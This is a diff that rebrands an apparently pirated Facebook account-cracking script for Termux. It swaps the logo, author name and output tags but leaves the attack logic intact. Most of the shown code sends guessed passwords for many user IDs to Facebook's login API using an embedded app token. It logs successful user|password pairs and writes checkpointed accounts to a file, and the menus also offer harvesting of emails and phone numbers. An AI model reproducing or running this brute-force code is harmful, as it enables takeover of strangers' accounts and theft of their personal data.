@@ -59,19 +59,20 @@ def cb():
 ##### LOGO #####
 logo="""
 
- \033[1;96m_   _ _____ _  ________    
- \033[1;96m| \ | |_   _| |/ /_   _|    
-\033[1;96m|  \| | | | | ' /  | |     
- \033[1;97m| . ` | | | |  <   | |     
-\033[1;97m| |\  |_| |_| . \ _| |_   
-\033[1;92m|_| \_|_____|_|\_\_____|  
+ \033[1;96m ______      ____     _____        _____     __    __    
+ \033[1;96m(____  )    (    )   (_   _)      (_   _)    \ \  / /    
+\033[1;96m     / /     / /\ \     | |          | |      () \/ ()    
+ \033[1;97m___/ /_    ( (__) )    | |          | |      / _  _ \    
+\033[1;97m/__  ___)    )    (     | |   __     | |     / / \/ \ \   
+\033[1;92m  / /____   /  /\  \  __| |___) )   _| |__  /_/      \_\  
+\033[1;92m(_______) /__(  )__\ \________/   /_____( (/          \) 
                                                           
 
 
 --------------------------------------------------
-➣ Auther   : NIKI HACKER
-➣ GitHub   : https://github.com/Niki-Cyber404
-➣ YouTube  : JAMES NIKI
+➣ Auther   : Z@lim
+➣ GitHub   : https://github.com/Za-lim
+➣ YouTube  : Waqt Mila Tu Sochay gy
 ➣ Poetry   : Zindagi tu Muhtasar ho ja 
               Shab e Ghum Muhtasar Nhii Hoti    
 --------------------------------------------------
@@ -150,7 +151,7 @@ def menu():
 	print ("[3] Grab Emails")
 	print ("[4] Grab Mobile Numbers")
 	print ("[5] Unfriend with one click")
-	print ("[6] Update NIKI Tool")
+	print ("[6] Update BXI Tool")
 	print ("[7] Follow Me On Facebook")
 	print ("[8] Log Out")
 	print ("[0] Exit            ")
@@ -289,7 +290,7 @@ def crack_action():
 			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass1
+				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
@@ -303,7 +304,7 @@ def crack_action():
 					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass2
+						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
@@ -317,7 +318,7 @@ def crack_action():
 							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
-								print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass3
+								print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
@@ -331,7 +332,7 @@ def crack_action():
 									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
-										print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass4
+										print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
@@ -345,7 +346,7 @@ def crack_action():
 											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
-												print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass5
+												print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass5
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
@@ -359,7 +360,7 @@ def crack_action():
 													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
-														print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass6
+														print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass6
 														oks.append(user+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
@@ -373,7 +374,7 @@ def crack_action():
 															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
-																print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass7
+																print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass7
 																oks.append(user+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
@@ -390,8 +391,8 @@ def crack_action():
 	p.map(main, id)
 	print (50*"-")
 	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print ("[✓] Total NIKI-OK/NIKI-CP : "+str(len(oks))+"/"+str(len(cpb)))
-	print("[✓] NIKI-CP File Has Been Saved : checkpoint.txt")
+	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
+	print("[✓] CP File Has Been Saved : checkpoint.txt")
 	raw_input("\n[Back]")
 	if xxx == "0":
 		crack_menu()
@@ -510,11 +511,11 @@ def choice_action():
 			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q1 = json.loads(data1.text)
 			if "access_token" in q1:
-				print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass1
+				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q1["error_msg"]:
-					print "[NIKI-CP] " + user + " | " + pass1
+					print "[Zalim Cp] " + user + " | " + pass1
 					cps = open("checkpoint.txt", "a")
 					cps.write(user+"|"+pass1+"\n")
 					cps.close()
@@ -523,11 +524,11 @@ def choice_action():
 					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q2 = json.loads(data2.text)
 					if "access_token" in q2:
-						print "\x1b[1;92m[NIKI-HACK]\x1b[0m " + user + " | " + pass2
+						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q2["error_msg"]:
-							print "[NIKI-CP] " + user + " | " + pass2
+							print "[Zalim Cp] " + user + " | " + pass2
 							cps = open("checkpoint.txt", "a")
 							cps.write(user+"|"+pass2+"\n")
 							cps.close()
@@ -536,11 +537,11 @@ def choice_action():
 							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q3 = json.loads(data3.text)
 							if "access_token" in q3:
-								print "\x1b[1;95m[NIKI-HACK]\x1b[0m " + user + " | " + pass3
+								print "\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q3["error_msg"]:
-									print "[NIKI-CP] " + user + " | " + pass3
+									print "[Zalim Cp] " + user + " | " + pass3
 									cps = open("checkpoint.txt", "a")
 									cps.write(user+"|"+pass3+"\n")
 									cps.close()
@@ -549,11 +550,11 @@ def choice_action():
 									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q4 = json.loads(data4.text)
 									if "access_token" in q4:
-										print "\x1b[1;94m[NIKI-HACK]\x1b[0m " + user + " | " + pass4
+										print "\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q4["error_msg"]:
-											print "[NIKI-CP] " + user + " | " + pass4
+											print "[Zalim Cp] " + user + " | " + pass4
 											cps = open("checkpoint.txt", "a")
 											cps.write(user+"|"+pass4+"\n")
 											cps.close()
@@ -562,11 +563,11 @@ def choice_action():
 											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q5 = json.loads(data5.text)
 											if "access_token" in q5:
-												print "\x1b[1;93m[NIKI-HACK]\x1b[0m " + user + " | " + pass5
+												print "\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q5["error_msg"]:
-													print "[NIKI-CP] " + user + " | " + pass5
+													print "[Zalim Cp] " + user + " | " + pass5
 													cps = open("checkpoint.txt", "a")
 													cps.write(user+"|"+pass5+"\n")
 													cps.close()
@@ -575,11 +576,11 @@ def choice_action():
 													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q6 = json.loads(data6.text)
 													if "access_token" in q6:
-														print "\x1b[1;97m[NIKI-HACK]\x1b[0m " + user + " | " + pass6
+														print "\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6
 														oks.append(user+pass6)
 													else:
 														if "www.facebook.com" in q6["error_msg"]:
-															print "[NIKI-CP] " + user + " | " + pass6
+															print "[CZalim Cp] " + user + " | " + pass6
 															cps = open("checkpoint.txt", "a")
 															cps.write(user+"|"+pass6+"\n")
 															cps.close()
@@ -588,11 +589,11 @@ def choice_action():
 															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q7 = json.loads(data7.text)
 															if "access_token" in q7:
-																print "\x1b[1;98m[NIKI-HACK]\x1b[0m " + user + " | " + pass7
+																print "\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7
 																oks.append(user+pass7)
 															else:
 																if "www.facebook.com" in q7["error_msg"]:
-																	print "[NIKI-CP] " + user + " | " + pass7
+																	print "[Zalim Cp] " + user + " | " + pass7
 																	cps = open("checkpoint.txt", "a")
 																	cps.write(user+"|"+pass7+"\n")
 																	cps.close()
@@ -606,7 +607,7 @@ def choice_action():
 	p.map(main, id)
 	print (50*"-")
 	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print ("[✓] Total NIKI-OK/NIKI-CP : "+str(len(oks))+"/"+str(len(cpb)))
+	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
 	print("[✓] CP File Has Been Saved : checkpoint.txt")
 	raw_input("\n[Back]")
 	if xxx == "0":
